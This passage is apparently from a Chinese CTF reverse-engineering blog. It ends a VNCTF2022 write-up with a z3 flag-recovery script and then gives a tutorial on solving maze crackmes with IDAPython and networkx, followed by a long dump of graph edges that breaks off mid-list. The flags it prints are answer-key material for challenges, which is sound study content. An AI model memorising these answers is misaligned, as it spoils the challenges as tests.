v3[i] = tmp[v4]</span><br><span class="line">        v4 = v4 + <span class="number">1</span></span><br><span class="line">        v4 = v4 % <span class="number">4</span></span><br><span class="line">    <span class="comment"># sub_401EA7</span></span><br><span class="line">    v4 = (v3[<span class="number">3</span>] &amp; <span class="number">0XFFFFFFFF</span>) | ((v3[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) &amp; <span class="number">0XFFFFFFFF</span>) | (</span><br><span class="line">        (v3[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) &amp; <span class="number">0XFFFFFFFF</span>) | ((v3[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) &amp; <span class="number">0XFFFFFFFF</span>)</span><br><span class="line">    <span class="keyword">return</span> (v4 ^ dword_4050C0[a2]) &amp; <span class="number">0XFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># flag = [0X31323334, 0X35363738, 0X39303132,</span></span><br><span class="line"><span class="comment">#         0x33343536, 0x37383930, 0x31323334] + [0] * 60</span></span><br><span class="line">v5 = <span class="number">6</span></span><br><span class="line">v3 = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> v5 &lt;= <span class="number">65</span>:</span><br><span class="line">    <span class="keyword">if</span> v5 % <span class="number">6</span>:</span><br><span class="line">        flag[v5] = flag[v5 - <span class="number">6</span>] ^ flag[v5 - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        v2 = flag[v5 - <span class="number">6</span>]</span><br><span class="line">        flag[v5] = v2 ^ sub_401FFB(flag[v5 - <span class="number">1</span>], v3)</span><br><span class="line">        v3 = v3 + <span class="number">1</span></span><br><span class="line">    v5 = v5 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">v4 = [<span class="number">0</span>] * <span class="number">24</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    v4[<span class="number">4</span> * i] = BYTE(flag[i + <span class="number">60</span>])</span><br><span class="line">    v4[<span class="number">4</span> * i + <span class="number">1</span>] = BYTE1(flag[i + <span class="number">60</span>])</span><br><span class="line">    v4[<span class="number">4</span> * i + <span class="number">2</span>] = BYTE2(flag[i + <span class="number">60</span>])</span><br><span class="line">    v4[<span class="number">4</span> * i + <span class="number">3</span>] = HIBYTE(flag[i + <span class="number">60</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">24</span>, <span class="number">1</span>):</span><br><span class="line">    v4[i - <span class="number">1</span>] ^= (v4[i - <span class="number">1</span>] % <span class="number">18</span> + v4[i] + <span class="number">5</span>) ^ <span class="number">0x41</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    s.add(v4[i] == dword_404080[i])</span><br><span class="line"></span><br><span class="line">s.add(flag[<span class="number">0</span>] == <span class="number">1447969620</span>)   <span class="comment"># VNCT</span></span><br><span class="line"><span class="keyword">assert</span> s.check() == sat</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;SUCCESS&quot;</span>)</span><br><span class="line">m = s.model()</span><br><span class="line">real_flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    real_flag += long_to_bytes(m[flag[i]].as_long())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(real_flag)</span><br><span class="line"><span class="comment"># VNCTF&#123;TimeFlightMachine&#125;</span></span><br></pre></td></tr></table></figure><img src="/2022/02/23/VNCTF2022_RE_WP/image-20220223165806233.png" class="" title="image-20220223165806233"><p>去掉空字符为flag： VNCTF{TimeFl20211205ightMachine}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>networkx 解决CTF_RE图最短路径问题</title>
      <link href="/2021/12/09/networkx%E8%A7%A3%E5%86%B3CTF_RE%E5%9B%BE%E9%97%AE%E9%A2%98/"/>
      <url>/2021/12/09/networkx%E8%A7%A3%E5%86%B3CTF_RE%E5%9B%BE%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="networkx-解决CTF-RE图最短路径问题"><a href="#networkx-解决CTF-RE图最短路径问题" class="headerlink" title="networkx 解决CTF_RE图最短路径问题"></a>networkx 解决CTF_RE图最短路径问题</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近复现了了下今年L3HCTF的IDAAAAA题，然后通过此题又联想到了之前做的一道特殊的迷宫题invisible_maze-fix,发现通过python的networkx解决此类问题相当的方便，因此记录下解题过程，方便以后查询。</p><blockquote><p>2道题目附件👇</p><p>链接：<a href="https://pan.baidu.com/s/1reVYGScanSCs5H4ykl60vw">https://pan.baidu.com/s/1reVYGScanSCs5H4ykl60vw</a><br>提取码：kvhl </p></blockquote><h2 id="invisible-maze"><a href="#invisible-maze" class="headerlink" title="invisible_maze"></a>invisible_maze</h2><h3 id="常规的迷宫题目"><a href="#常规的迷宫题目" class="headerlink" title="常规的迷宫题目"></a>常规的迷宫题目</h3><p>在CTF逆向题目中，常规的迷宫题目一般是程序给你一个非常长的字符串，然后自己整理可以得到整个迷宫的全貌，比如下图这种</p><p><img src="./clipboard-16390185611301.png" alt="img"></p><p><img src="./clipboard.png" alt="img"></p><p>这种能很容易的得到整个迷宫的路径，可是这个invisible_maze这个题才可以说是是真正的迷宫题，因为它没有从上帝视角给你路径的全貌，而是把你放到了个迷宫中，每走一步，它告诉你，上下左右分别去哪</p><h3 id="本题题解"><a href="#本题题解" class="headerlink" title="本题题解"></a>本题题解</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>IDA打开程序分析</p><p><img src="./image-20211209110800442.png" alt="image-20211209110800442"></p><p>进入<code>sub_401050</code>函数， 程序告诉你上下左右走的话是什么东西，很明显，只有进入另一个函数路才是通的</p><p><img src="./image-20211209110827867.png" alt="image-20211209110827867"></p><p>直接查找字符串，交叉引用来到成功的地方</p><p><img src="./image-20211209110947859.png" alt="image-20211209110947859"></p><p>可以发现只有进入到<code>sub_41F1E0</code>,然后再按s才会成功，而整个迷宫的路径是非常复杂的</p><p><img src="./image-20211209111136677.png" alt="image-20211209111117862"></p><p>观察函数窗口，发现从<code>sub_401050</code> 到 <code>sub_41F270</code> 全是这样的结构，我们手动的去画出整个迷宫显然是不现实的，每个函数其实就是一个节点，然后两个节点就构成了一条边，比如：<code>sub_401050</code>就是一个节点，而<code>sub_401050 ---&gt; sub_4010E0</code>就是一条边。</p><p><img src="./image-20211209111600322.png" alt="image-20211209111600322"></p><p>每个函数的结构基本差不多，考虑打算用IDAPython打印出每个节点，以及它对应的adsw对应的四个值，如果是进入另外一个函数的话，那么本函数和进入的那个函数就构造成了一条边，最后将节点和边传入python的networkx库就能构造出整个迷宫图，直接调用函数就能求最短路径了。</p><p>发现函数只有下面2种情况</p><p><img src="./image-20211209112224977.png" alt="image-20211209112224977"></p><p><img src="./image-20211209112517700.png" alt="image-20211209112517700"></p><p>当经过case表跳转后，如果第一条汇编指令是<code>push xxx</code>，那么肯定是不通的（除了成功的那个位置），如果是<code>call sub_xxx</code>的话，那么本条汇编指令就可以找到下一个函数（节点），如果是<code>pop esi</code>的话，下一条<code>jmp xxx</code>就是进入的下一个函数（节点）</p><h4 id="编写IDAPython脚本"><a href="#编写IDAPython脚本" class="headerlink" title="编写IDAPython脚本"></a>编写IDAPython脚本</h4><p>写IDAPython脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_edges_from_func</span>(<span class="params">func_addr</span>):</span></span><br><span class="line">    func_end_addr = idc.find_func_end(func_addr)  <span class="comment"># 找到此函数末尾地址</span></span><br><span class="line">    addr = func_addr</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> addr &lt; func_end_addr:</span><br><span class="line">        addr = idc.next_head(addr)<span class="comment"># 得到下一条汇编指令的地址</span></span><br><span class="line">        <span class="keyword">if</span> idc.print_insn_mnem(addr) == <span class="string">&#x27;movzx&#x27;</span>:<span class="comment"># 得到本条汇编指令的操作指令</span></span><br><span class="line">            index_table_addr = get_operand_value(addr ,<span class="number">1</span>)<span class="comment"># 得到adsw对应的索引表，对应上2图的0x4010C0 和 0x41E384</span></span><br><span class="line">            addr = idc.next_head(addr)  <span class="comment"># 来到Jmp ds:xxxx[eax * 4]的位置</span></span><br><span class="line">            switch_table_addr = get_operand_value(addr ,<span class="number">0</span>)  <span class="comment"># 得到case表的地址</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    value = get_bytes(index_table_addr, <span class="number">23</span>)</span><br><span class="line">    index_adws = [value[<span class="number">0</span>], value[<span class="number">3</span>], value[<span class="number">18</span>], value[<span class="number">22</span>]] <span class="comment"># 获取adsw对应的4个数</span></span><br><span class="line">    <span class="comment"># print(index_adws)</span></span><br><span class="line">    </span><br><span class="line">    edges = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> index_adws:    <span class="comment"># 遍历    </span></span><br><span class="line">        tmp = get_wide_dword(switch_table_addr + i * <span class="number">4</span>)</span><br><span class="line">        <span class="keyword">if</span> idc.print_insn_mnem(tmp) == <span class="string">&#x27;push&#x27;</span>:</span><br><span class="line">            edges.append(<span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">elif</span> idc.print_insn_mnem(tmp) == <span class="string">&#x27;call&#x27;</span>:</span><br><span class="line">            edges.append(get_operand_value(tmp ,<span class="number">0</span>))<span class="comment"># 得到call的那个函数的地址</span></span><br><span class="line">        <span class="keyword">elif</span> idc.print_insn_mnem(tmp) == <span class="string">&#x27;pop&#x27;</span>:</span><br><span class="line">            tmp = idc.next_head(tmp)    <span class="comment"># 来到jmp sub_xxx的地址</span></span><br><span class="line">            edges.append(get_operand_value(tmp ,<span class="number">0</span>))   </span><br><span class="line">    <span class="comment"># print(edges)</span></span><br><span class="line">    <span class="keyword">return</span> edges</span><br><span class="line"></span><br><span class="line">func_list = <span class="built_in">list</span>(Functions(<span class="number">0x401050</span>, <span class="number">0x41F271</span>))<span class="comment"># 列出此范围所有的函数</span></span><br><span class="line">all_edges = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> func_list:</span><br><span class="line">    edges = get_edges_from_func(i)</span><br><span class="line">    all_edges.append(edges)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(all_edges)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;len(func_list): %d&quot;</span> % <span class="built_in">len</span>(func_list))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;len(all_edges): %d&quot;</span> % <span class="built_in">len</span>(all_edges))</span><br><span class="line"><span class="built_in">print</span>(func_list)</span><br></pre></td></tr></table></figure><p>输入结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[[None, 4198624, None, None], [4198480, None, 4198784, None], [None, None, 4207712, 4198624], [None, 4199104, 4211312, None], [4198944, 4199264, None, None], [4199104, 4199424, None, None], [4199264, 4199584, None, None], [4199424, 4199744, None, None], [4199584, 4199904, 4211472, None], [4199744, 4200064, None, None], [4199904, 4200224, None, None], [4200064, 4200384, None, None], [4200224, 4200544, None, None], [4200384, 4200688, None, None], [4200544, 4200848, None, None], [4200688, 4201008, None, None], [4200848, 4201168, None, None], [4201008, 4201312, None, None], [4201168, 4201456, None, None], [4201312, 4201616, None, None], [4201456, 4201776, None, None], [4201616, 4201936, None, None], [4201776, 4202096, None, None], [4201936, 4202240, None, None], [4202096, 4202384, None, None], [4202240, 4202544, None, None], [4202384, 4202704, None, None], [4202544, 4202848, None, None], [4202704, 4203008, None, None], [4202848, 4203168, None, None], [4203008, 4203328, None, None], [4203168, 4203488, None, None], [4203328, 4203648, None, None], [4203488, 4203808, None, None], [4203648, 4203968, None, None], [4203808, 4204128, None, None], [4203968, 4204272, None, None], [4204128, 4204432, None, None], [4204272, 4204592, None, None], [4204432, 4204752, None, None], [4204592, 4204912, None, None], [4204752, 4205056, None, None], [4204912, 4205216, None, None], [4205056, 4205376, None, None], [4205216, 4205536, None, None], [4205376, None, 4211632, None], [None, 4205824, 4211792, None], [4205680, 4205984, None, None], [4205824, 4206144, None, None], [4205984, 4206304, None, None], [4206144, 4206448, None, None], [4206304, 4206608, None, None], [4206448, 4206768, None, None], [4206608, 4206928, None, None], [4206768, 4207088, None, None], [4206928, 4207232, None, None], [4207088, 4207392, None, None], [4207232, 4207552, None, None], [4207392, None, 4211952, None], [None, 4207872, None, 4198784], [4207712, 4208032, None, None], [4207872, 4208192, None, None], [4208032, 4208352, None, None], [4208192, 4208496, None, None], [4208352, 4208656, None, None], [4208496, 4208816, None, None], [4208656, 4208960, None, None], [4208816, 4209120, 4212112, None], [4208960, 4209280, None, None], [4209120, 4209440, None, None], [4209280, 4209600, None, None], [4209440, 4209760, None, None], [4209600, 4209904, None, None], [4209760, 4210064, None, None], [4209904, 4210224, None, None], [4210064, 4210368, None, None], [4210224, 4210528, None, None], [4210368, 4210688, 4212272, None], [4210528, 4210832, None, None], [4210688, 4210992, None, None], [4210832, 4211152, None, None], [4210992, 4211312, None, None], [4211152, None, None, 4198944], [None, None, 4212432, 4199744], [None, None, 4216832, 4205536], [None, None, 4216992, 4205680], [None, None, 4217136, 4207552], [None, None, 4218240, 4208960], [None, None, 4218400, 4210528], [None, None, 4218560, 4211472], [None, 4212752, 4218720, None], [4212592, 4212912, None, None], [4212752, 4213072, None, None], [4212912, 4213232, None, None], [4213072, 4213392, None, None], [4213232, 4213552, None, None], [4213392, 4213696, None, None], [4213552, 4213856, None, None], [4213696, 4214016, None, None], [4213856, 4214176, None, None], [4214016, 4214320, None, None], [4214176, 4214480, None, None], [4214320, 4214640, None, None], [4214480, 4214800, None, None], [4214640, 4214960, None, None], [4214800, 4215120, None, None], [4214960, 4215280, None, None], [4215120, 4215440, None, None], [4215280, 4215584, None, None], [4215440, 4215744, None, None], [4215584, 4215904, None, None], [4215744, 4216064, None, None], [4215904, 4216208, None, None], [4216064, 4216352, None, None], [4216208, 4216512, None, None], [4216352, 4216672, None, None], [4216512, None, 4218880, None], [None, None, 4219040, 4211632], [None, None, 4219200, 4211792], [None, None, 4219360, 4211952], [None, 4217440, 4219520, None], [4217296, 4217600, None, None], [4217440, 4217760, None, None], [4217600, 4217920, None, None], [4217760, 4218080, None, None], [4217920, None, 4219680, None], [None, None, 4219840, 4212112], [None, None, 4219984, 4212272], [None, None, 4220144, 4212432], [None, None, 4220304, 4212592], [None, None, 4220464, 4216672], [None, None, 4220608, 4216832], [None, None, 4220768, 4216992], [None, None, 4222032, 4217136], [None, None, 4222192, 4217296], [None, None, 4222352, 4218080], [None, None, 4222496, 4218240], [None, None, 4222640, 4218400], [None, None, 4223248, 4218560], [None, None, 4223856, 4218720], [None, None, 4225584, 4218880], [None, None, 4225744, 4219040], [None, 4220928, None, 4219200], [4220768, 4221088, None, None], [4220928, 4221232, None, None], [4221088, 4221392, None, None], [4221232, 4221552, None, None], [4221392, 4221712, None, None], [4221552, 4221872, None, None], [4221712, None, 4225888, None], [None, None, 4226048, 4219360], [None, None, 4226208, 4219520], [None, None, 4226688, 4219680], [None, None, 4227008, 4219840], [None, None, 4227168, 4219984], [None, 4222928, None, None], [4222800, 4223088, None, None], [4222928, 4223248, None, None], [4223088, 4223408, None, 4220144], [4223248, 4223568, None, None], [4223408, 4223712, None, None], [4223568, None, None, None], [None, None, 4227328, 4220304], [None, 4224176, 4227488, None], [4224016, 4224336, None, None], [4224176, 4224496, None, None], [4224336, 4224656, None, None], [4224496, 4224816, None, None], [4224656, 4224976, None, None], [4224816, 4225120, None, None], [4224976, 4225264, None, None], [4225120, 4225424, None, None], [4225264, None, 4227648, None], [None, None, 4227808, 4220464], [None, None, 4227968, 4220608], [None, None, 4228112, 4221872], [None, None, 4228272, 4222032], [None, None, 4228576, 4222192], [None, 4226528, 4228736, None], [4226368, 4226688, None, None], [4226528, None, None, 4222352], [None, 4227008, 4228896, None], [4226848, None, None, 4222496], [None, None, 4229056, 4222640], [None, None, 4229680, 4223856], [None, None, 4229840, 4224016], [None, None, 4230928, 4225424], [None, None, 4231088, 4225584], [None, None, 4231248, 4225744], [None, None, 4232208, 4225888], [None, 4228416, None, 4226048], [4228272, None, 4232368, None], [None, None, 4232672, 4226208], [None, None, 4232832, 4226368], [None, None, 4232992, 4226848], [None, None, 4233152, 4227168], [None, 4229376, 4233312, None], [4229216, 4229520, None, None], [4229376, 4229680, None, None], [4229520, None, None, 4227328], [None, 4229984, None, 4227488], [4229840, 4230144, None, None], [4229984, 4230288, None, None], [4230144, 4230448, None, None], [4230288, 4230608, None, None], [4230448, 4230768, None, None], [4230608, None, 4233472, None], [None, None, 4233616, 4227648], [None, None, 4233776, 4227808], [None, None, 4233920, 4227968], [None, 4231568, 4234080, None], [4231408, 4231728, None, None], [4231568, 4231888, None, None], [4231728, 4232048, None, None], [4231888, None, 4234240, None], [None, None, 4234400, 4228112], [None, 4232528, None, 4228416], [4232368, None, 4234560, None], [None, None, 4234880, 4228576], [None, None, 4235328, 4228736], [None, None, 4235792, 4228896], [None, None, 4236576, 4229056], [None, None, 4236736, 4229216], [None, None, 4238784, 4230768], [None, None, 4238944, 4230928], [None, None, 4239104, 4231088], [None, None, 4239264, 4231248], [None, None, 4239424, 4231408], [None, None, 4239584, 4232048], [None, None, 4239744, 4232208], [None, 4234720, None, 4232528], [4234560, None, 4239904, None], [None, 4235040, None, 4232672], [4234880, 4235200, None, None], [4235040, 4235328, None, None], [4235200, None, 4240064, 4232832], [None, 4235632, 4240368, None], [4235488, 4235792, None, None], [4235632, 4235952, None, 4232992], [4235792, 4236112, None, None], [4235952, 4236272, None, None], [4236112, 4236432, None, None], [4236272, None, None, None], [None, None, 4240528, 4233152], [None, 4236896, None, 4233312], [4236736, 4237056, None, None], [4236896, 4237216, None, None], [4237056, 4237376, None, None], [4237216, 4237520, None, None], [4237376, 4237664, None, None], [4237520, 4237824, None, None], [4237664, 4237984, None, None], [4237824, 4238144, None, None], [4237984, 4238304, None, None], [4238144, 4238464, None, None], [4238304, 4238624, None, None], [4238464, 4238784, None, None], [4238624, None, None, 4233472], [None, None, 4240688, 4233616], [None, None, 4240848, 4233776], [None, None, 4241008, 4233920], [None, None, 4241168, 4234080], [None, None, 4241312, 4234240], [None, None, 4241456, 4234400], [None, None, 4241616, 4234720], [None, 4240224, None, 4235328], [4240064, 4240368, None, None], [4240224, None, None, 4235488], [None, None, 4241776, 4236576], [None, None, 4246640, 4238944], [None, None, 4246800, 4239104], [None, None, 4246960, 4239264], [None, None, 4247120, 4239424], [None, None, 4247280, 4239584], [None, None, 4247440, 4239744], [None, None, 4247904, 4239904], [None, 4241936, None, 4240528], [4241776, 4242096, None, None], [4241936, 4242256, None, None], [4242096, 4242416, None, None], [4242256, 4242576, None, None], [4242416, 4242736, None, None], [4242576, 4242896, None, None], [4242736, 4243040, None, None], [4242896, 4243200, None, None], [4243040, 4243360, None, None], [4243200, 4243504, None, None], [4243360, 4243664, None, None], [4243504, 4243824, None, None], [4243664, 4243984, None, None], [4243824, 4244144, None, None], [4243984, 4244288, None, None], [4244144, 4244448, None, None], [4244288, 4244608, None, None], [4244448, 4244768, None, None], [4244608, 4244928, None, None], [4244768, 4245072, None, None], [4244928, 4245232, None, None], [4245072, 4245392, None, None], [4245232, 4245536, None, None], [4245392, 4245696, None, None], [4245536, 4245840, None, None], [4245696, 4246000, None, None], [4245840, 4246160, None, None], [4246000, 4246320, None, None], [4246160, 4246480, None, None], [4246320, 4246640, None, None], [4246480, None, None, 4240688], [None, None, 4248064, 4240848], [None, None, 4248224, 4241008], [None, None, 4248384, 4241168], [None, None, 4248544, 4241312], [None, None, 4248704, 4241456], [None, None, 4248864, None], [None, 4247904, 4249184, None], [4247744, None, None, 4241616], [None, None, 4257312, 4246800], [None, None, 4257472, 4246960], [None, None, 4257632, 4247120], [None, None, 4257760, 4247280], [None, None, 4257920, 4247440], [None, 4249024, 4258080, 4247600], [4248864, 4249184, None, None], [4249024, None, None, 4247744], [None, 4249504, 4258240, None], [4249344, 4249664, None, None], [4249504, 4249824, None, None], [4249664, 4249984, None, None], [4249824, 4250144, None, None], [4249984, 4250304, None, None], [4250144, 4250464, None, None], [4250304, 4250624, None, None], [4250464, 4250784, None, None], [4250624, 4250944, None, None], [4250784, 4251088, None, None], [4250944, 4251248, None, None], [4251088, 4251408, None, None], [4251248, 4251568, None, None], [4251408, 4251712, None, None], [4251568, 4251872, None, None], [4251712, 4252032, None, None], [4251872, 4252192, None, None], [4252032, 4252336, None, None], [4252192, 4252496, None, None], [4252336, 4252656, None, None], [4252496, 4252816, None, None], [4252656, 4252976, None, None], [4252816, 4253136, None, None], [4252976, 4253296, None, None], [4253136, 4253456, None, None], [4253296, 4253616, None, None], [4253456, 4253776, None, None], [4253616, 4253936, None, None], [4253776, 4254096, None, None], [4253936, 4254240, None, None], [4254096, 4254400, None, None], [4254240, 4254544, None, None], [4254400, 4254704, None, None], [4254544, 4254848, None, None], [4254704, 4255008, None, None], [4254848, 4255152, None, None], [4255008, 4255312, None, None], [4255152, 4255472, None, None], [4255312, 4255616, None, None], [4255472, 4255776, None, None], [4255616, 4255936, None, None], [4255776, 4256080, None, None], [4255936, 4256240, None, None], [4256080, 4256400, None, None], [4256240, 4256560, None, None], [4256400, 4256704, None, None], [4256560, 4256848, None, None], [4256704, 4257008, None, None], [4256848, 4257152, None, None], [4257008, None, 4258400, None], [None, None, 4258544, 4248064], [None, None, 4258704, 4248224], [None, None, None, 4248384], [None, None, 4258864, 4248544], [None, None, 4259024, 4248704], [None, None, 4259184, 4248864], [None, None, 4259344, 4249344], [None, None, 4263760, 4257152], [None, None, 4263920, 4257312], [None, None, 4264080, 4257472], [None, None, 4265200, 4257760], [None, None, 4265344, 4257920], [None, None, 4265504, 4258080], [None, None, 4265648, 4258240], [None, 4259648, 4265792, None], [4259488, 4259808, None, None], [4259648, 4259968, None, None], [4259808, 4260128, None, None], [4259968, None, 4265952, None], [None, 4260448, 4266112, None], [4260288, 4260592, None, None], [4260448, 4260752, None, None], [4260592, 4260912, None, None], [4260752, 4261072, None, None], [4260912, 4261232, None, None], [4261072, 4261392, None, None], [4261232, 4261552, None, None], [4261392, 4261712, None, None], [4261552, 4261872, None, None], [4261712, 4262032, None, None], [4261872, 4262176, None, None], [4262032, 4262320, None, None], [4262176, 4262480, None, None], [4262320, 4262640, None, None], [4262480, 4262800, None, None], [4262640, 4262960, None, None], [4262800, 4263120, None, None], [4262960, 4263280, None, None], [4263120, 4263440, None, None], [4263280, 4263600, None, None], [4263440, None, 4266272, None], [None, None, 4268496, 4258400], [None, None, 4268656, 4258544], [None, 4264240, None, 4258704], [4264080, 4264400, None, None], [4264240, 4264560, None, None], [4264400, 4264720, None, None], [4264560, 4264880, None, None], [4264720, 4265040, None, None], [4264880, 4265200, None, None], [4265040, None, None, 4258864], [None, None, 4268816, 4259024], [None, None, 4268976, 4259184], [None, None, 4269136, 4259344], [None, None, 4269296, 4259488], [None, None, 4269456, 4260128], [None, None, 4269616, 4260288], [None, 4266432, None, 4263600], [4266272, 4266592, None, None], [4266432, 4266752, None, None], [4266592, 4266912, None, None], [4266752, 4267072, None, None], [4266912, 4267232, None, None], [4267072, 4267392, None, None], [4267232, 4267552, None, None], [4267392, 4267712, None, None], [4267552, 4267872, None, None], [4267712, 4268032, None, None], [4267872, 4268192, None, None], [4268032, 4268352, None, None], [4268192, 4268496, None, None], [4268352, None, None, 4263760], [None, None, 4269760, 4263920], [None, None, 4272288, 4265344], [None, None, 4272448, 4265504], [None, None, 4272608, 4265648], [None, None, 4273392, 4265792], [None, None, 4273552, 4265952], [None, None, 4273696, 4266112], [None, 4269920, None, 4268656], [4269760, 4270080, None, None], [4269920, 4270240, None, None], [4270080, 4270400, None, None], [4270240, 4270560, None, None], [4270400, 4270720, None, None], [4270560, 4270880, None, None], [4270720, 4271040, None, None], [4270880, 4271184, None, None], [4271040, 4271328, None, None], [4271184, 4271488, None, None], [4271328, 4271648, None, None], [4271488, 4271808, None, None], [4271648, 4271968, None, None], [4271808, 4272128, None, None], [4271968, 4272288, None, None], [4272128, None, None, 4268816], [None, None, 4274480, 4268976], [None, 4272768, None, 4269136], [4272608, 4272928, None, None], [4272768, 4273088, None, None], [4272928, 4273248, None, None], [4273088, 4273392, None, None], [4273248, None, None, 4269296], [None, None, 4274640, 4269456], [None, None, 4274800, 4269616], [None, 4274000, 4277808, None], [4273840, 4274160, None, None], [4274000, 4274320, None, None], [4274160, None, 4277968, None], [None, None, 4284896, 4272448], [None, None, 4286496, 4273552], [None, 4274960, None, 4273696], [4274800, 4275120, None, None], [4274960, 4275280, None, None], [4275120, 4275440, None, None], [4275280, 4275584, None, None], [4275440, 4275744, None, None], [4275584, 4275904, None, None], [4275744, 4276064, None, None], [4275904, 4276208, None, None], [4276064, 4276368, None, None], [4276208, 4276528, None, None], [4276368, 4276688, None, None], [4276528, 4276848, None, None], [4276688, 4277008, None, None], [4276848, 4277168, None, None], [4277008, 4277328, None, None], [4277168, 4277488, None, None], [4277328, 4277648, None, None], [4277488, 4277808, None, None], [4277648, None, None, 4273840], [None, 4278128, None, 4274320], [4277968, 4278288, None, None], [4278128, 4278448, None, None], [4278288, 4278608, None, None], [4278448, 4278768, None, None], [4278608, 4278928, None, None], [4278768, 4279072, None, None], [4278928, 4279216, None, None], [4279072, 4279376, None, None], [4279216, 4279536, None, None], [4279376, 4279696, None, None], [4279536, 4279840, None, None], [4279696, 4280000, None, None], [4279840, 4280160, None, None], [4280000, 4280304, None, None], [4280160, 4280464, None, None], [4280304, 4280624, None, None], [4280464, 4280784, None, None], [4280624, 4280944, None, None], [4280784, 4281088, None, None], [4280944, 4281248, None, None], [4281088, 4281408, None, None], [4281248, 4281568, None, None], [4281408, 4281728, None, None], [4281568, 4281888, None, None], [4281728, 4282048, None, None], [4281888, 4282208, None, None], [4282048, 4282352, None, None], [4282208, 4282512, None, None], [4282352, 4282656, None, None], [4282512, 4282816, None, None], [4282656, 4282976, None, None], [4282816, 4283136, None, None], [4282976, 4283296, None, None], [4283136, 4283456, None, None], [4283296, 4283616, None, None], [4283456, 4283776, None, None], [4283616, 4283936, None, None], [4283776, 4284096, None, None], [4283936, 4284256, None, None], [4284096, 4284416, None, None], [4284256, 4284576, None, None], [4284416, 4284736, None, None], [4284576, 4284896, None, None], [4284736, None, None, 4274480], [None, 4285216, 4286656, None], [4285056, 4285376, None, None], [4285216, 4285536, None, None], [4285376, 4285696, None, None], [4285536, 4285856, None, None], [4285696, 4286016, None, None], [4285856, 4286176, None, None], [4286016, 4286336, None, None], [4286176, 4286496, None, None], [4286336, None, None, 4274640], [None, None, 4296976, 4285056], [None, 4286976, 4297136, None], [4286816, 4287120, None, None], [4286976, 4287264, None, None], [4287120, 4287424, None, None], [4287264, 4287584, None, None], [4287424, 4287744, None, None], [4287584, 4287904, None, None], [4287744, 4288064, None, None], [4287904, 4288224, None, None], [4288064, 4288384, None, None], [4288224, 4288528, None, None], [4288384, 4288688, None, None], [4288528, 4288848, None, None], [4288688, 4288992, None, None], [4288848, 4289152, None, None], [4288992, 4289312, None, None], [4289152, 4289472, None, None], [4289312, 4289632, None, None], [4289472, 4289792, None, None], [4289632, 4289952, None, None], [4289792, 4290112, None, None], [4289952, 4290272, None, None], [4290112, 4290432, None, None], [4290272, 4290592, None, None], [4290432, 4290752, None, None], [4290592, 4290912, None, None], [4290752, 4291072, None, None], [4290912, 4291232, None, None], [4291072, 4291376, None, None], [4291232, 4291536, None, None], [4291376, 4291696, None, None], [4291536, 4291856, None, None], [4291696, 4292000, None, None], [4291856, 4292144, None, None], [4292000, 4292288, None, None], [4292144, 4292448, None, None], [4292288, 4292608, None, None], [4292448, 4292768, None, None], [4292608, 4292928, None, None], [4292768, 4293088, None, None], [4292928, 4293248, None, None], [4293088, 4293392, None, None], [4293248, 4293552, None, None], [4293392, 4293696, None, None], [4293552, 4293856, None, None], [4293696, 4294016, None, None], [4293856, 4294160, None, None], [4294016, 4294320, None, None], [4294160, 4294480, 4297296, None], [4294320, 4294640, None, None], [4294480, 4294800, None, None], [4294640, 4294944, None, None], [4294800, 4295088, None, None], [4294944, 4295232, None, None], [4295088, 4295392, None, None], [4295232, 4295552, None, None], [4295392, 4295696, None, None], [4295552, 